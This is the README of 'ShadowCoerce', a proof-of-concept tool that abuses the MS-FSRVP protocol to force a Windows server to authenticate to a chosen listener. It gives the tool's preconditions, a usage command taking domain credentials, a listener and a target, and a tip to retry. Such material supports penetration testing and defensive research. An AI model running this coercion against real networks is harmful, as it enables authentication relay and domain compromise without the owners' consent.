# ShadowCoerce
MS-FSRVP coercion abuse PoC

Credits: Gilles LIONEL (a.k.a. Topotam)
Source: https://twitter.com/topotam77/status/1475701014204461056

Explanation: https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/ms-fsrvp

MS Docs: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-fsrvp/dae107ec-8198-4778-a950-faa7edad125b

"File Server VSS Agent Service" needs to be enabled on the target server.

```shell
shadowcoerce.py -d "domain" -u "user" -p "password" LISTENER TARGET
```

![example](.assets/example.png)

*In my tests, the coercion needed to be attempted twice in order to work when the FssAgent hadn't been requested in a while. **TL;DR: run the command twice if it doesn't work.***